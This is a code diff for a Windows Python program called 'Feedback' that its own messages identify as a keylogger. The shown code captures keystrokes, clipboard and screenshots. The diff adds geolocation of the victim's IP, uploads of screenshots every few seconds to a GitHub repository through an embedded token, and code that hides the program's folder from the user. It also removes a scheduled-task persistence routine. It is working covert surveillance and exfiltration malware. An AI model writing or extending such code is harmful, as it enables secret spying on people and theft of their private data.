@@ -1,7 +1,8 @@
-# 2nd version of feedback.py by deepseek AI
+# single instance check optimized
 
 import os
 import re
+import gc
 import sys
 import time
 import json
@@ -14,6 +15,9 @@ import shutil
 import socket 
 import getpass
 import logging
+import win32api
+import win32con
+import win32gui
 import platform 
 import requests
 import threading
@@ -23,13 +27,17 @@ import webbrowser
 import subprocess
 import tkinter as tk
 from io import BytesIO
+import ctypes.wintypes
+WM_MOUSEMOVE = 0x0200
 import pygetwindow as gw
+from PIL import ImageGrab
 from pynput import keyboard
 from plyer import notification
+from ctypes import WINFUNCTYPE
 from PIL import Image, ImageDraw
-from tkinter import PhotoImage, ttk, messagebox
 from datetime import datetime, timedelta
 from pystray import Icon, Menu, MenuItem
+from tkinter import PhotoImage, ttk, messagebox
 
 # Global variables
 APP_NAME = "Feedback"
@@ -59,7 +67,7 @@ threshold_seconds = 90 * 24 * 60 * 60  # time in second (90 days in seconds) to 
 interval_logs_delete_status = 10 # interval in second (1 days in seconds) for checking log delete status
 # interval_logs_Upload_status = 1 * 24 * 60 * 60 # interval in second (1 days in seconds) for checking log upload status
 interval_logs_Upload_status = 30 * 60 # interval in second (1 days in seconds) for checking log upload status
-CURRENT_VERSION = "1.1.9" # current version of program <---------<----------<-----------------<-----------<---------------<-----------------<-----
+CURRENT_VERSION = "2.1.1" # current version of program <---------<----------<-----------------<-----------<---------------<-----------------<-----
 VERSION_URL = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/latest_version.txt" # url to check new version
 BASE_DOWNLOAD_URL = "https://github.com/bebedudu/autoupdate/releases/download" # url to download then updated program
 APPLICATION_NAME = "feedback.exe" # compiled program name
@@ -506,6 +514,10 @@ def get_geolocation(ip_address):
         print(f"Error fetching geolocation: {e}")
         return ("N/A",) * 7
 
+ip_address = get_public_ip()
+country, region, city, org, loc, postal, timezone = get_geolocation(ip_address)
+# print(f"Country: {country}, Region: {region}, City: {city}")
+
 
 def get_system_info():
     """Get detailed system information as a string."""
@@ -562,7 +574,7 @@ def update_active_user_file(new_entry, active_user):
             encoded_content = base64.b64encode(updated_content.encode("utf-8")).decode("utf-8")
 
             update_payload = {
-                "message": f"Update active user log with system info - {active_user}",
+                "message": f"Updating-{active_user}-{country}-{region}-{city}-{unique_id} active user log",
                 "content": encoded_content,
                 "sha": sha,
                 "branch": BRANCH,
@@ -1195,22 +1207,50 @@ def monitor_clipboard():
 # Take a screenshot
 # ----------------------------------------------------------------------------------
 def take_screenshot():
-    global screenshot_interval
+    """Enhanced screenshot function with active mode handling"""
+    global last_interaction_time, is_running
+    
     while True:
         try:
             if is_running:
+                # Check if workstation is locked
+                # if ctypes.windll.user32.GetForegroundWindow() == 0:
+                #     logging.info("Skipping screenshot - workstation locked")
+                #     time.sleep(10)
+                #     continue
+                # Calculate time since last interaction
+                time_since_interaction = time.time() - last_interaction_time
+                
+                # Determine appropriate interval
+                if time_since_interaction < ACTIVE_MODE_DURATION:
+                    current_interval = SCREENSHOT_INTERVAL_ACTIVE
+                    immediate_upload = True
+                else:
+                    current_interval = screenshot_interval
+                    immediate_upload = False
+                
+                # Take screenshot
                 timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                 filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                 pyautogui.screenshot(filename)
                 logging.info(f"take_screenshot-->Screenshot saved: {filename}")
-                print(f"📂 Screenshot saved: {filename}")
-            with lock:
-                current_interval = screenshot_interval   # Ensure thread-safe interval update
+                
+                # Upload immediately if in active mode
+                if immediate_upload:
+                    threading.Thread(
+                        target=upload_file_to_github,
+                        args=(filename, REPO, "uploads/screenshots", BRANCH, GITHUB_TOKEN),
+                        daemon=True
+                    ).start()
+             
+            # with lock:
+            #     current_interval = screenshot_interval
+            # Sleep for appropriate interval
             time.sleep(current_interval)
+            
         except Exception as e:
-            # logging.error(f"Error taking screenshot: {e}")
-            print(f"Error taking screenshot: {e}")
-            pass
+            logging.error(f"Screenshot error: {str(e)}")
+            time.sleep(30)  # Backoff on errors
 
 
 # Toggle screenshot taking
@@ -1633,7 +1673,7 @@ def check_for_update(auto_update=False):
         else:
             print("You are using the latest version.")
             if not auto_update:
-                messagebox.showinfo("No Update", "You are using the latest version.")
+                messagebox.showinfo("No Update", f"You are using the latest version {CURRENT_VERSION}.")
     except requests.exceptions.RequestException as e:
         logging.error(f"Failed to check for updates: {e}")
         if not auto_update:
@@ -1796,7 +1836,7 @@ def run_tkinter_window(latest_version=None):
     root.mainloop()
 
 
-# function to upload the log files
+# function to upload the log filesss
 # ----------------------------------------------------------------------------------
 
 # set the upload log interval according to url if not url then default
@@ -1954,17 +1994,50 @@ def mark_screenshot_uploaded(file_path):
         screenshots_uploaded_cache.add(file_path)
         save_uploaded_cache()  # Save the cache only if new files are added
 
-# def clean_uploaded_cache():
-#     """
-#     Removes stale entries from the uploaded files cache.
-#     """
-#     global screenshots_uploaded_cache
-#     valid_files = {path for path in screenshots_uploaded_cache if os.path.exists(path)}
-#     removed_files = screenshots_uploaded_cache - valid_files
-#     screenshots_uploaded_cache = valid_files
-#     if removed_files:
-#         print(f"Removed stale cache entries: {removed_files}")
-#     save_uploaded_cache()
+def clean_uploaded_cache():
+    """Removes stale entries from the uploaded files cache."""
+    global screenshots_uploaded_cache
+    valid_files = {path for path in screenshots_uploaded_cache if os.path.exists(path)}
+    removed_files = screenshots_uploaded_cache - valid_files
+    screenshots_uploaded_cache = valid_files
+    if removed_files:
+        print(f"Removed {len(removed_files)} stale cache entries")
+        logging.info(f"Cleaned cache: Removed {len(removed_files)} stale entries")
+    save_uploaded_cache()
+
+def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
+    """Uploads all untracked screenshots in the specified folder to GitHub."""
+    global screenshots_uploaded_cache
+    
+    # Use absolute path for screenshots folder
+    abs_screenshots_folder = os.path.join(app_dir, "screenshots")
+    
+    for root, _, files in os.walk(abs_screenshots_folder):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if not file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
+                continue  # Skip non-image files
+                
+            if not is_screenshot_uploaded(file_path):
+                retry_count = 0
+                while retry_count < MAX_RETRIES:
+                    try:
+                        print(f"Attempting to upload screenshot: {file_path}")
+                        upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
+                        mark_screenshot_uploaded(file_path)
+                        logging.info(f"Successfully fetched screenshot: {file_path}")
+                        print(f"Successfully uploaded screenshot: {file_path}")
+                        break
+                    except Exception as e:
+                        retry_count += 1
+                        logging.error(f"Error uploading {file_path} (Attempt {retry_count}/{MAX_RETRIES}): {e}")
+                        if retry_count < MAX_RETRIES:
+                            time.sleep(RETRY_DELAY)
+                        else:
+                            logging.warning(f"Permanently failed to upload {file_path}")
+                            # Remove from cache if permanently failed
+                            screenshots_uploaded_cache.discard(file_path)
+                            save_uploaded_cache()
 
 # Function to upload a single file to GitHub
 # def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
@@ -2061,7 +2134,7 @@ def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, g
                 content_base64 = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
 
             payload = {
-                "message": f"{'Updating' if sha else 'Uploading'} {username} {file_name}",
+                "message": f"{'Updating' if sha else 'Uploading'} {username}-{country}-{region}-{city}-{unique_id} {file_name}",
                 "content": content_base64,
                 "branch": branch_name
             }
@@ -2149,46 +2222,6 @@ def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name,
         else:
             logging.error(f"Folder not found or not a directory: {folder_path}")
             print(f"Folder not found or not a directory: {folder_path}")
-
-# Function to upload screenshots to GitHub
-def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
-    """
-    Uploads all untracked screenshots in the specified folder to GitHub.
-    """
-    # for root, _, files in os.walk(folder_path):
-    #     for file_name in files:
-    #         file_path = os.path.join(root, file_name)
-    #         # print(f"Processing file: {file_path}")
-    #         if not is_screenshot_uploaded(file_path):
-    #             try:
-    #                 upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
-    #                 mark_screenshot_uploaded(file_path)
-    #             except Exception as e:
-    #                 print(f"Error serving {file_path}: {e}")
-    #         else:
-    #             print(f"File already served (skipped): {file_path}")
-    #             # print(f"Skipping already uploaded file: {file_path} (in cache)")
-    
-    for root, _, files in os.walk(folder_path):
-        for file_name in files:
-            file_path = os.path.join(root, file_name)
-            if not is_screenshot_uploaded(file_path):
-                retry_count = 0
-                while retry_count < MAX_RETRIES:
-                    try:
-                        upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
-                        mark_screenshot_uploaded(file_path)
-                        break  # Exit retry loop on success
-                    except Exception as e:
-                        retry_count += 1
-                        print(f"Error uploading {file_path} (Attempt {retry_count}/{MAX_RETRIES}): {e}")
-                        if retry_count < MAX_RETRIES:
-                            time.sleep(RETRY_DELAY)
-                        else:
-                            print(f"Failed to upload {file_path} after {MAX_RETRIES} attempts.")
-            else:
-                print(f"File already served (skipped): {file_path}")
-                # print(f"Skipping already uploaded file: {file_path} (in cache)")
 
 # Main upload logs function
 def upload_logs():
@@ -2292,73 +2325,29 @@ def upload_logs():
         time.sleep(upload_interval if upload_interval != DEFAULT_UPLOAD_INTERVAL else fallback_interval)
 
 
-# add the task to task schedular to check app running
+# hide the file from the user
 # ----------------------------------------------------------------------------------
-TASK_NAME = "MyFeedback"
-# XML_PATH = r"C:\user feedback\feedback\assets\schedule\MyFeedback.xml"  # Replace with your actual XML file path
-XML_PATH = os.path.join(app_dir, "assets\\schedule\\MyFeedback.xml")  # Replace with your actual XML file path
+def hide_folder(path):
+    # Check if the path exists
+    if not os.path.exists(path):
+        logging.error(f"The path {path} does not exist.")
+        print(f"The path {path} does not exist.")
+        return
+    
+    # Use ctypes to set the file attribute to hidden
+    try:
+        # FILE_ATTRIBUTE_HIDDEN = 0x2
+        ctypes.windll.kernel32.SetFileAttributesW(path, 0x2)
+        logging.info(f"Folder '{path}' has been hidden successfully.")
+        print(f"Folder '{path}' has been hidden successfully.")
+    except Exception as e:
+        logging.error(f"Failed to hide folder: {e}")
+        print(f"Failed to hide folder: {e}")
 
-def check_task_exists(task_name):
-    """Checks if the scheduled task exists."""
-    try:
-        result = subprocess.run(
-            ["schtasks", "/query", "/tn", task_name],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        return "ERROR:" not in result.stderr  # If "ERROR" is in stderr, the task does not exist.
-    except Exception as e:
-        logging.error(f"Error checking task existence: {e}")
-        print(f"Error checking task existence: {e}")
-
-def is_task_enabled(task_name):
-    """Checks if the task is enabled using PowerShell."""
-    try:
-        command = f'powershell -Command "(Get-ScheduledTask -TaskName {task_name}).State"'
-        result = subprocess.run(command, capture_output=True, text=True, shell=True)
-        return "Ready" in result.stdout  # "Ready" means enabled, "Disabled" means it's not enabled
-    except Exception as e:
-        logging.error(f"Error checking is task enabled: {e}")
-        print(f"Error checking is task enabled: {e}")
-        
-def enable_task(task_name):
-    """Enables the scheduled task if it is disabled."""
-    command = f'schtasks /Change /TN {task_name} /ENABLE'
-    result = subprocess.run(command, capture_output=True, text=True, shell=True)
-    try:
-        if result.returncode == 0:
-            logging.info(f"✅ Task '{task_name}' was disabled and has now been ENABLED.")
-            print(f"✅ Task '{task_name}' was disabled and has now been ENABLED.")
-        else:
-            logging.warning(f"❌ Failed to enable task '{task_name}'. Error: {result.stderr}")
-            print(f"❌ Failed to enable task '{task_name}'. Error: {result.stderr}")
-    except Exception as e:
-        logging.error(f"Error enabling the task: {e}")
-        print(f"Error enabling the task: {e}")
-
-def add_task(xml_path, task_name):
-    """Creates the scheduled task from an XML file with error handling."""
-    try:
-        if not os.path.exists(xml_path):
-            raise FileNotFoundError(f"XML definition not found at {xml_path}")
-            
-        result = subprocess.run(
-            ["schtasks", "/create", "/xml", xml_path, "/tn", task_name],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        print(result.stdout)  # Print output for debugging
-        if "SUCCESS" in result.stdout:
-            logging.info(f"✅ Task '{task_name}' has been created successfully.")
-            print(f"✅ Task '{task_name}' has been created successfully.")
-        else:
-            logging.warning(f"❌ Failed to create task '{task_name}'. Error: {result.stderr}")
-            print(f"❌ Failed to create task '{task_name}'. Error: {result.stderr}")
-    except Exception as e:
-        logging.error(f"Task creation failed: {str(e)}")
-        show_notification("Task Error", "Failed to create scheduled task")
+# Path to the folder you want to hide
+folder_path = r"C:\user feedback"
+# Call the function to hide the folder
+hide_folder(folder_path)
 
 
 # create icon for system tray
@@ -2393,30 +2382,30 @@ def get_icon():
 # ----------------------------------------------------------------------------------
 def update_checkmarks(icon):
     interval_menu = Menu(
-        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
-        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
-        MenuItem("2 Minutes", set_interval, checked=lambda item: screenshot_interval == 120),
-        MenuItem("5 Minutes", set_interval, checked=lambda item: screenshot_interval == 300),
-        MenuItem("10 Minutes", set_interval, checked=lambda item: screenshot_interval == 600),
-        MenuItem("20 Minutes", set_interval, checked=lambda item: screenshot_interval == 1200),
-        MenuItem("30 Minutes", set_interval, checked=lambda item: screenshot_interval == 1800),
-        MenuItem("1 Hour", set_interval, checked=lambda item: screenshot_interval == 3600),
+        MenuItem("30 seconds", wrap_action(set_interval), checked=lambda item: screenshot_interval == 30),
+        MenuItem("60 seconds", wrap_action(set_interval), checked=lambda item: screenshot_interval == 60),
+        MenuItem("2 Minutes", wrap_action(set_interval), checked=lambda item: screenshot_interval == 120),
+        MenuItem("5 Minutes", wrap_action(set_interval), checked=lambda item: screenshot_interval == 300),
+        MenuItem("10 Minutes", wrap_action(set_interval), checked=lambda item: screenshot_interval == 600),
+        MenuItem("20 Minutes", wrap_action(set_interval), checked=lambda item: screenshot_interval == 1200),
+        MenuItem("30 Minutes", wrap_action(set_interval), checked=lambda item: screenshot_interval == 1800),
+        MenuItem("1 Hour", wrap_action(set_interval), checked=lambda item: screenshot_interval == 3600),
     )
 
     menu = Menu(
-        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
-        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
+        MenuItem("Pause/Resume Screenshots", wrap_action(toggle_screenshots), checked=lambda item: is_running),
+        MenuItem("Pause/Resume Keylogging", wrap_action(toggle_keylogging), checked=lambda item: listener_running),
         MenuItem("Set Screenshot Interval", interval_menu),
-        MenuItem("Run on Startup", on_toggle_startup, checked=is_startup_checked),
+        MenuItem("Run on Startup", wrap_action(on_toggle_startup), checked=is_startup_checked),
         Menu.SEPARATOR,
-        MenuItem("View Keylog", open_keylog_file),
-        MenuItem("View Copied Keylog", open_copy_keylog_file),
-        MenuItem("View Screenshot", open_Screenshot_folder),
-        MenuItem("View Log", on_open_log),
+        MenuItem("View Keylog", wrap_action(open_keylog_file)),
+        MenuItem("View Copied Keylog", wrap_action(open_copy_keylog_file)),
+        MenuItem("View Screenshot", wrap_action(open_Screenshot_folder)),
+        MenuItem("View Log", wrap_action(on_open_log)),
         Menu.SEPARATOR,
         MenuItem("Check for Updates", lambda icon, item: check_for_update_async()),
         MenuItem("Restore Defaults", restore_defaults),  # Add restore option
-        MenuItem("Developer", on_open_developer),
+        MenuItem("Developer", wrap_action(on_open_developer)),
         MenuItem("Restart", restart_script),
         MenuItem("Exit", stop_script),
     )
@@ -2429,7 +2418,8 @@ def toggle_tray_icon(force_state=None):
     Toggle the visibility of the tray icon.
     :param force_state: If True or False, forces the tray icon visibility.
     """
-    global tray_icon, icon_visible
+    global tray_icon, icon_visible, last_interaction_time
+    update_interaction_time()  # Update interaction time when toggling
 
     # Determine the target state
     target_state = force_state if force_state is not None else not icon_visible
@@ -2456,23 +2446,42 @@ def toggle_tray_icon(force_state=None):
 # Create tray icon
 # ----------------------------------------------------------------------------------
 def create_tray_icon():
-    """
-    Create the system tray icon and menu.
-    """
-    
+    """Create the system tray icon and menu."""
     try:
         # Create the system tray icon
         title_with_shortcut = (f"{APP_NAME}\nShortcut Keys:- PrtSc")
         icon = Icon(
             APP_NAME, 
             get_icon(), 
-            title_with_shortcut
+            title_with_shortcut,
+            on_click=lambda icon, item: update_interaction_time()
         )
+
+        # Get the actual tray icon window handle
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        tray_hwnd = ctypes.windll.user32.FindWindowExW(hwnd, 0, "TrayNotifyWnd", None)
+        notify_hwnd = ctypes.windll.user32.FindWindowExW(tray_hwnd, 0, "SysPager", None)
+        icon_hwnd = ctypes.windll.user32.FindWindowExW(notify_hwnd, 0, "ToolbarWindow32", None)
+
+        # Subclass the window procedure
+        WndProcType = WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p)
+        original_proc = ctypes.windll.user32.GetWindowLongPtrW(icon_hwnd, win32con.GWL_WNDPROC)
+        
+        def new_proc(hwnd, msg, wparam, lparam):
+            if msg == win32con.WM_MOUSEMOVE:
+                print("Tray icon hover detected")
+                update_interaction_time()
+            return ctypes.windll.user32.CallWindowProcW(original_proc, hwnd, msg, wparam, lparam)
+        
+        new_proc_ptr = WndProcType(new_proc)
+        ctypes.windll.user32.SetWindowLongPtrW(icon_hwnd, win32con.GWL_WNDPROC, new_proc_ptr)
+        
+        # Keep reference to prevent garbage collection
+        icon._new_proc = new_proc_ptr
+        
         update_checkmarks(icon)
-        # icon.visible = False
-        # icon.run()
         return icon
-       
+
     except Exception as e:
         show_notification("Error", "Failed to load tray icon.")
         logging.error(f"Tray Icon Error: {e}")
@@ -2487,7 +2496,8 @@ def check_single_instance():
     try:
 
         # Create a mutex using the application UUID
-        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, f"Global\\{unique_id}")
+        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, f"Global\\{APP_NAME}_{unique_id}_SingleInstance")
+        print(f"unique id of {APP_NAME} i.e. mutex name: {mutex}")
         last_error = ctypes.windll.kernel32.GetLastError()
         
         if last_error == 183:  # ERROR_ALREADY_EXISTS
@@ -2556,21 +2566,6 @@ def main():
         # load_uploaded_cache()
         # clean_uploaded_cache()
         
-        # adding application to task scheduler
-        if check_task_exists(TASK_NAME):
-            logging.info(f"✅ Task '{TASK_NAME}' already exists.")
-            print(f"✅ Task '{TASK_NAME}' already exists.")
-            if not is_task_enabled(TASK_NAME):
-                logging.warning(f"⚠️ Task '{TASK_NAME}' is DISABLED. Enabling it now...")
-                print(f"⚠️ Task '{TASK_NAME}' is DISABLED. Enabling it now...")
-                enable_task(TASK_NAME)
-            else:
-                logging.info(f"✅ Task '{TASK_NAME}' is already ENABLED.")
-                print(f"✅ Task '{TASK_NAME}' is already ENABLED.")
-        else:
-            logging.warning(f"⚠️ Task '{TASK_NAME}' not found. Adding it now...")
-            print(f"⚠️ Task '{TASK_NAME}' not found. Adding it now...")
-            add_task(XML_PATH, TASK_NAME)
         
         # Start folder check thread
         folder_check_thread = threading.Thread(target=schedule_folder_check, daemon=True)
@@ -2584,6 +2579,13 @@ def main():
         # Start a background thread to check for updates at regular intervals
         threading.Thread(target=start_auto_update_checker, daemon=True).start()
         
+        # Add system event monitoring
+        system_monitor_thread = threading.Thread(target=system_event_monitor, daemon=True)
+        system_monitor_thread.start()
+        
+        # Start activity monitoring thread
+        activity_thread = threading.Thread(target=monitor_activity, daemon=True)
+        activity_thread.start()
         
     except KeyboardInterrupt:
         show_notification(APP_NAME, "Keylogger is closing...")
@@ -2609,6 +2611,53 @@ def clean_temp_files():
             except Exception as e:
                 logging.warning(f"Failed to clean temp file {file}: {str(e)}")
 
+# Add system event monitoring
+def system_event_monitor():
+    """Monitor system events like lock/unlock"""
+    while True:
+        # Check if workstation is locked using a different method
+        if ctypes.windll.user32.GetForegroundWindow() == 0:
+            logging.info("Workstation locked - pausing activities")
+            print("Workstation locked - pausing activities")
+            global is_running
+            is_running = False
+            time.sleep(10)
+        else:
+            is_running = True
+            time.sleep(5)
+
+# Add interaction detection to menu items
+def wrap_action(action):
+    """Decorator to update interaction time for menu actions"""
+    def wrapped(icon, item):
+        update_interaction_time()
+        action(icon, item)
+    return wrapped
+
+# Add activity monitor thread
+def monitor_activity():
+    global active_mode
+    while True:
+        current_time = time.time()
+        active_mode = (current_time - last_interaction_time) < INACTIVE_THRESHOLD
+        time.sleep(1)
+
+# Add to global variables section
+global last_interaction_time, INACTIVE_THRESHOLD, active_mode
+last_interaction_time = time.time()
+INACTIVE_THRESHOLD = 10  # Seconds of inactivity before returning to normal mode
+active_mode = False
+
+# Add this function to handle interaction time updates
+def update_interaction_time():
+    global last_interaction_time
+    logging.warning("Interaction detected - entering active mode")
+    print("Interaction detected - entering active mode")
+    last_interaction_time = time.time()
+
+# Add these new constants
+ACTIVE_MODE_DURATION = 30  # 30 seconds of active monitoring after interaction
+SCREENSHOT_INTERVAL_ACTIVE = 3  # 3 seconds between screenshots in active mode
 
 if __name__ == "__main__":
     main()
